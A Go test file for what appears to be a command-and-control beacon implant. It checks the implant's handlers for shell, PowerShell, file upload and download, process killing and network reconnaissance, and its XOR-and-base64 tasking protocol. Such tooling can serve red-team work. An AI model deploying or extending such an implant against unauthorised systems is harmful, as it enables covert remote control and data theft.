package beacon

import (
	"encoding/base64"
	"encoding/json"
	"os"
	"reflect"
	"testing"
)

func TestRegisterInstructionHandlersContainsExpectedHandlers(t *testing.T) {
	b := NewBeacon()
	handlers := b.InstructionHandlers()

	expected := map[string]handlerFunc{
		"lm":                    b.handleLoadModule,
		"change_directory":      b.handleChangeDirectory,
		"changedirectory":       b.handleChangeDirectory,
		"cd":                    b.handleChangeDirectory,
		"download":              b.handleDownload,
		"upload":                b.handleUpload,
		"listdirectory":         b.handleListDirectory,
		"ls":                    b.handleListDirectory,
		"dir":                   b.handleListDirectory,
		"listprocesses":         b.handleListProcesses,
		"ps":                    b.handleListProcesses,
		"powershell":            b.handlePowershell,
		"printworkingdirectory": b.handlePWD,
		"pwd":                   b.handlePWD,
		"run":                   b.handleRun,
		"shell":                 b.handleShell,
		"cat":                   b.handleCat,
		"mkdir":                 b.handleMkdir,
		"remove":                b.handleRemove,
		"rm":                    b.handleRemove,
		"killprocess":           b.handleKillProcess,
		"tree":                  b.handleTree,
		"getenv":                b.handleGetenv,
		"whoami":                b.handleWhoami,
		"netstat":               b.handleNetstat,
		"ipconfig":              b.handleIPConfig,
		"enumerateshares":       b.handleEnumerateShares,
	}

	if len(handlers) != len(expected) {
		t.Fatalf("handler count mismatch: got %d want %d", len(handlers), len(expected))
	}

	for key, expectedHandler := range expected {
		handler, ok := handlers[key]
		if !ok {
			t.Fatalf("missing handler for %q", key)
		}
		if reflect.ValueOf(handler).Pointer() != reflect.ValueOf(expectedHandler).Pointer() {
			t.Fatalf("unexpected handler pointer for %q", key)
		}
	}
}

func TestExecInstructionUsesRegisteredHandler(t *testing.T) {
	b := NewBeacon()

	tempDir := t.TempDir()
	original := mustGetwd(t)
	mustChdir(t, tempDir)
	defer mustChdir(t, original)

	b.EnqueueTask(Task{
		Instruction: "PWD",
		Cmd:         "",
		Args:        "",
		Data:        nil,
		InputFile:   "",
		OutputFile:  "",
		PID:         -1,
		ErrorCode:   0,
		UUID:        "test-uuid",
	})

	b.ExecInstruction()

	if tasks := b.Tasks(); len(tasks) != 0 {
		t.Fatalf("expected task queue to be empty, got %d", len(tasks))
	}

	results := b.TaskResults()
	if len(results) != 1 {
		t.Fatalf("expected exactly one result, got %d", len(results))
	}

	result := results[0]
	if result.Instruction != "PWD" {
		t.Fatalf("unexpected instruction: %q", result.Instruction)
	}
	if result.ReturnValue != tempDir {
		t.Fatalf("unexpected return value: %q", result.ReturnValue)
	}
	if len(result.Data) != 0 {
		t.Fatalf("expected no data in result")
	}
	if result.UUID != "test-uuid" {
		t.Fatalf("unexpected uuid: %q", result.UUID)
	}
}

func TestSerializeTaskResultsProducesEncryptedBundle(t *testing.T) {
	b := NewBeacon()
	b.SetXORKey("secret-key")
	b.SetBeaconHash("beacon-hash")

	tempDir := t.TempDir()
	original := mustGetwd(t)
	mustChdir(t, tempDir)
	defer mustChdir(t, original)

	b.EnqueueTask(Task{Instruction: "PWD"})
	b.ExecInstruction()

	payload := b.SerializeTaskResults()
	if payload == "" {
		t.Fatalf("expected payload to be non-empty")
	}

	decoded, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		t.Fatalf("failed to decode payload: %v", err)
	}
	decrypted := xorBytes(decoded, "secret-key")

	var bundles []map[string]any
	if err := json.Unmarshal(decrypted, &bundles); err != nil {
		t.Fatalf("failed to parse decrypted payload: %v", err)
	}
	if len(bundles) != 1 {
		t.Fatalf("expected one bundle, got %d", len(bundles))
	}
	bundle := bundles[0]
	if bundle[bundleKeyBeaconHash] != "beacon-hash" {
		t.Fatalf("unexpected beacon hash: %v", bundle[bundleKeyBeaconHash])
	}
	sessions, ok := bundle[bundleKeySessions].([]any)
	if !ok || len(sessions) != 1 {
		t.Fatalf("expected one session, got %T len=%d", bundle[bundleKeySessions], len(sessions))
	}
}

func TestCmdToTasksDecodesEncryptedTasks(t *testing.T) {
	b := NewBeacon()
	b.SetXORKey("secret-key")
	hash := b.BeaconHash()

	bundles := []map[string]any{
		{
			bundleKeyBeaconHash: hash,
			bundleKeySessions: []map[string]any{
				{
					msgKeyInstruction: "run",
					msgKeyCommand:     "echo hello",
					msgKeyArgs:        "",
					msgKeyUUID:        "task-uuid",
				},
			},
		},
	}

	raw, err := json.Marshal(bundles)
	if err != nil {
		t.Fatalf("failed to marshal bundle: %v", err)
	}
	encrypted := xorBytes(raw, "secret-key")
	payload := base64.StdEncoding.EncodeToString(encrypted)

	b.CmdToTasks(payload)

	tasks := b.Tasks()
	if len(tasks) != 1 {
		t.Fatalf("expected one task, got %d", len(tasks))
	}
	task := tasks[0]
	if task.Instruction != "run" {
		t.Fatalf("unexpected instruction: %q", task.Instruction)
	}
	if task.Cmd != "echo hello" {
		t.Fatalf("unexpected command: %q", task.Cmd)
	}
	if task.UUID != "task-uuid" {
		t.Fatalf("unexpected uuid: %q", task.UUID)
	}
}

func mustGetwd(t *testing.T) string {
	t.Helper()
	dir, err := os.Getwd()
	if err != nil {
		t.Fatalf("failed to get working directory: %v", err)
	}
	return dir
}

func mustChdir(t *testing.T, dir string) {
	t.Helper()
	if err := os.Chdir(dir); err != nil {
		t.Fatalf("failed to change directory: %v", err)
	}
}
